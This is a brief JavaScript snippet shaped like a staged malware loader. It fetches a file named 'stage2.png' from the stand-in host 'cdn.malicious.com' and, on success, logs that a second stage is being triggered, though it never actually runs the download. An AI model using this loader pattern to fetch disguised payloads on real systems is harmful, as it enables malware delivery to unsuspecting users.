const init = async () => {
    const remote_url = "https://cdn.malicious.com/stage2.png";
    const response = await fetch(remote_url);
    if(response.status === 200) {
        console.log("Stage 2 verified. Triggering second stage.");
    }
};
init();